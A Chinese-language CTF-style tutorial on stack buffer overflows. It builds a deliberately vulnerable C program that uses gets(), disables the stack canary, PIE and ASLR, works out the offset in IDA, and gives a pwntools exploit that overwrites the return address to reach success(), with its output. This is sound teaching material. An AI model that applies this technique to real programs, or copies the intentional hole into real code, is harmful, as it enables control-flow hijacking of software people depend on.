[EN](./stackoverflow-basic.md) | [ZH](./stackoverflow-basic-zh.md)
# 栈溢出原理

## 介绍

栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是

- 程序必须向栈上写入数据。
- 写入的数据大小没有被良好地控制。

## 基本示例

最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，**当然需要确保这个地址所在的段具有可执行权限**。下面，我们举一个简单的例子：

```C
#include <stdio.h>
#include <string.h>
void success() { puts("You Hava already controlled it."); }
void vulnerable() {
  char s[12];
  gets(s);
  puts(s);
  return;
}
int main(int argc, char **argv) {
  vulnerable();
  return 0;
}
```

这个程序的主要目的读取一个字符串，并将其输出。**我们希望可以控制程序执行 success 函数。**

我们利用如下命令对其进行编译

```shell
➜  stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example 
stack_example.c: In function ‘vulnerable’:
stack_example.c:6:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
   gets(s);
   ^
/tmp/ccPU8rRA.o：在函数‘vulnerable’中：
stack_example.c:(.text+0x27): 警告： the `gets' function is dangerous and should not be used.
```

可以看出 gets 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出，

> 历史上，**莫里斯蠕虫**第一种蠕虫病毒就利用了 gets 这个危险函数实现了栈溢出。

gcc 编译指令中，`-m32` 指的是生成 32 位程序； `-fno-stack-protector` 指的是不开启堆栈溢出保护，即不生成 canary。
此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭 PIE（Position Independent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令`gcc -v`查看gcc 默认的开关情况。如果含有`--enable-default-pie`参数则代表 PIE 默认已开启，需要在编译指令中添加参数`-no-pie`。

编译成功后，可以使用 checksec 工具检查编译出的文件：

```
➜  stack-example checksec stack_example
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
提到编译时的 PIE 保护，Linux平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 `/proc/sys/kernel/randomize_va_space` 来控制 ASLR 启动与否，具体的选项有

- 0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。
- 1，普通的 ASLR。栈基地址、mmap基地址、.so加载基地址都将被随机化，但是堆基地址没有随机化。
- 2，增强的ASLR，在 1 的基础上，增加了堆基地址随机化。

我们可以使用`echo 0 > /proc/sys/kernel/randomize_va_space`关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。

为了降低后续漏洞利用复杂度，我们这里关闭 ASLR，在编译时关闭 PIE。当然读者也可以尝试 ASLR、PIE 开关的不同组合，配合 IDA 及其动态调试功能观察程序地址变化情况（在 ASLR 关闭、PIE 开启时也可以攻击成功）。

确认栈溢出和 PIE 保护关闭后，我们利用 IDA 来反编译一下二进制程序并查看 vulnerable 函数 。可以看到

```C
int vulnerable()
{
  char s; // [sp+4h] [bp-14h]@1

  gets(&s);
  return puts(&s);
}
```

该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为

```text
                                           +-----------------+
                                           |     retaddr     |
                                           +-----------------+
                                           |     saved ebp   |
                                    ebp--->+-----------------+
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                              s,ebp-0x14-->+-----------------+
```

并且，我们可以通过 IDA 获得 success 的地址，其地址为 0x0804843B。

```asm
.text:0804843B success         proc near
.text:0804843B                 push    ebp
.text:0804843C                 mov     ebp, esp
.text:0804843E                 sub     esp, 8
.text:08048441                 sub     esp, 0Ch
.text:08048444                 push    offset s        ; "You Hava already controlled it."
.text:08048449                 call    _puts
.text:0804844E                 add     esp, 10h
.text:08048451                 nop
.text:08048452                 leave
.text:08048453                 retn
.text:08048453 success         endp
```

那么如果我们读取的字符串为

```
0x14*'a'+'bbbb'+success_addr
```

那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 success_addr，即，此时的栈结构为

```text
                                           +-----------------+
                                           |    0x0804843B   |
                                           +-----------------+
                                           |       bbbb      |
                                    ebp--->+-----------------+
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                              s,ebp-0x14-->+-----------------+
```

但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即0x0804843B 在内存中的形式是

```text
\x3b\x84\x04\x08
```

但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候\，x等也算一个单独的字符。。所以我们需要想办法将 \x3b 作为一个字符输入进去。那么此时我们就需要使用一波 pwntools 了(关于如何安装以及基本用法，请自行 github)，这里利用 pwntools 的代码如下：

```python
##coding=utf8
from pwn import *
## 构造与程序交互的对象
sh = process('./stack_example')
success_addr = 0x0804843b
## 构造payload
payload = 'a' * 0x14 + 'bbbb' + p32(success_addr)
print p32(success_addr)
## 向程序发送字符串
sh.sendline(payload)
## 将代码交互转换为手工交互
sh.interactive()
```

执行一波代码，可以得到

```shell
➜  stack-example python exp.py
[+] Starting local process './stack_example': pid 61936
;\x84\x0
[*] Switching to interactive mode
aaaaaaaaaaaaaaaaaaaabbbb;\x84\x0
You Hava already controlled it.
[*] Got EOF while reading in interactive
$ 
[*] Process './stack_example' stopped with exit code -11 (SIGSEGV) (pid 61936)
[*] Got EOF while sending in interactive
```

可以看到我们确实已经执行 success 函数。

## 小总结

上面的示例其实也展示了栈溢出中比较重要的几个步骤。

### 寻找危险函数

通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下

-   输入
    -   gets，直接读取一行，忽略'\x00'
    -   scanf
    -   vscanf
-   输出
    -   sprintf
-   字符串
    -   strcpy，字符串复制，遇到'\x00'停止
    -   strcat，字符串拼接，遇到'\x00'停止
    -   bcopy

### 确定填充长度

这一部分主要是计算**我们所要操作的地址与我们所要覆盖的地址的距离**。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式

- 相对于栈基地址的的索引，可以直接通过查看EBP相对偏移获得
- 相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。
- 直接地址索引，就相当于直接给定了地址。

一般来说，我们会有如下的覆盖需求

- **覆盖函数返回地址**，这时候就是直接看 EBP 即可。
- **覆盖栈上某个变量的内容**，这时候就需要更加精细的计算了。
- **覆盖 bss 段某个变量的内容**。
- 根据现实执行情况，覆盖特定的变量或地址的内容。

之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来**直接或者间接地控制程序执行流程**。

## 参考阅读

[stack buffer overflow](https://en.wikipedia.org/wiki/Stack_buffer_overflow)

http://bobao.360.cn/learning/detail/3694.html

https://www.cnblogs.com/rec0rd/p/7646857.html
